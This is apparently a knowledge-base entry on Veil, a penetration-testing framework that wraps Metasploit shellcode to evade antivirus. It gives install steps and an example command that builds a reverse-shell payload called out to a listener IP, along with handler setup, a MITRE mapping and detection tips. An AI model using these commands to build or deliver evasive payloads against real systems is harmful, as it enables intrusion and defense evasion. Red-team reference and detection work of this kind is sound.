---
id: 7e1fbea7-0fa2-4fbb-964d-7a543f119884
name: Veil
type: tool
verified: true
created_at: '2019-08-28T21:17:41.086871+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
platforms:
  - Linux
tags:
  - payload-generation
  - evasion
  - metasploit
  - antivirus-bypass
url: 'https://github.com/Veil-Framework/Veil'
validated: true
---

# Veil

**Status**: Unverified

## Overview

Veil is a framework designed to generate Metasploit payloads that can bypass common antivirus solutions. It is primarily used in penetration testing and red team operations to create custom payloads for initial access and post-exploitation while evading detection.

## Description

Veil-Evasion, the core component, provides a collection of payload modules written in various languages (e.g., Python, C, Ruby) that wrap Metasploit shellcode in obfuscated or encoded formats. This makes the payloads harder for signature-based antivirus to detect. It integrates with Metasploit for handler setup and payload delivery. Note: Veil is somewhat outdated and has been superseded by tools like TheFatRat or Covenant, but it remains a reference for evasion techniques.

## Features

- Feature 1: Multiple payload types (e.g., reverse TCP shells, Meterpreter injectors) in languages like Python, C, and assembly.
- Feature 2: Built-in Wine support for generating Windows executables on Linux hosts.
- Feature 3: Interactive menu for selecting and configuring payloads with options like LHOST, LPORT.
- Feature 4: Integration with msfvenom for shellcode generation.

## Installation

### Requirements

- Python 2.7 (legacy requirement)
- Wine (for Windows payload compilation)
- Git
- Metasploit Framework

### Install Commands

```bash
# Clone the repository
sudo git clone https://github.com/Veil-Framework/Veil.git /opt/Veil

# Navigate and setup
cd /opt/Veil
sudo ./config/setup.sh --force --silent

# For Kali Linux (may require manual setup as it's not pre-packaged)
# Ensure dependencies: apt install python2 wine git
```

On Ubuntu: Follow the same git clone and setup.sh steps. Add /opt/Veil to PATH if needed.

## Basic Usage

```bash
cd /opt/Veil && ./Veil.py
```

This launches the interactive menu. Use 'list' to see payloads, then generate with options.

### Common Options

| Option | Description |
|--------|-------------|
| `-t, --type` | Specify module type (e.g., list, evasion) |
| `-p, --payload` | Select specific payload module |
| `-o, --output` | Directory for output files |
| `--options` | Pass payload options like LHOST=IP,LPORT=PORT |

## Examples

### Example 1: Basic Usage

```bash
./Veil.py -t list
```
Lists available payloads.

### Example 2: Advanced Usage

Generate a Python reverse shell payload:

```bash
./Veil.py -p python/shellcode_inject -o /tmp/ --options LHOST=192.168.1.100,LPORT=4444
```
This creates an executable payload ready for delivery via social engineering or exploits. Set up a Metasploit handler: use multi/handler, set payload to match, and run.

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[Obfuscated Files or Information]] Obfuscated Files or Information
- [[Process Injection]] Process Injection
- [[Execution through API]] Native API

### Tactics

- [[Execution]] Execution
- [[Persistence]] Persistence
- [[Command and Control]] Command and Control

## Detection

Indicators and methods for detecting this tool's usage:

- Detection method 1: Monitor for Wine processes compiling executables or unusual Python/C scripts generating binaries.
- Detection method 2: AV/EDR signatures for known Veil-generated payloads (though evasion is the goal).
- Detection method 3: Network traffic to Metasploit handlers on non-standard ports.

## Related Procedures

```dataview
TABLE name as "Procedure", verified as "Verified"
FROM "procedures"
WHERE contains(tools, this.file.link)
SORT name ASC
LIMIT 10
```

## Related Tools

- [[Metasploit]]
- [[tools/msfvenom]]

## References

- Official GitHub: https://github.com/Veil-Framework/Veil
- Documentation: README in repo
- Related resources: Offensive Security blogs on payload evasion
